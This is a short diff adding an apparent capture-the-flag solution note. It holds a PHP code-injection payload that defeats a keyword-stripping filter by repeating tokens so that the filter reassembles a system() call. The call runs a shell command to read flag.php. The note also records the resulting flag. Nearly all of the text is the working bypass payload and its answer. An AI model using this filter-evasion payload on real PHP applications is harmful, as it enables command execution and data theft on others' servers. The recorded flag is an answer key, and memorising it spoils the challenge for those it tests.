@@ -1,0 +1,4 @@
+
+Payload : <<<<????php $a = syssyssyssystemtemtemtem("cd ../../../; cacacacatttt flflflflagagagag.php"); ????>>>>
+
+Flag : flag{wait_but_i_fixed_it_after_my_last_two_blunders_i_even_filtered_three_times_:(((}
